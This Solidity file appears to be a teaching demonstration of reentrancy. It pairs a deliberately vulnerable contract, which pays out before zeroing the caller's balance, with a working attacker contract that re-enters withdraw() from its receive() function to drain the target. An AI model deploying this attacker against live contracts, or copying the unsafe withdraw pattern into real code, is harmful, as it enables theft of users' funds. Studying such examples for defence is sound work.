// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;

contract ReentrancyVuln {
    uint constant public WITHDRAW_LIMIT = 1 ether;
    mapping(address => uint256) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrancyAttack {
    ReentrancyVuln public reentrancyVuln;

    constructor(address _address) {
        reentrancyVuln = ReentrancyVuln(_address);
    }

    receive() external payable {
        if (address(reentrancyVuln).balance >= 1000) {
            reentrancyVuln.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1000, "No provided ether");
        reentrancyVuln.deposit{value: msg.value}();
        reentrancyVuln.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}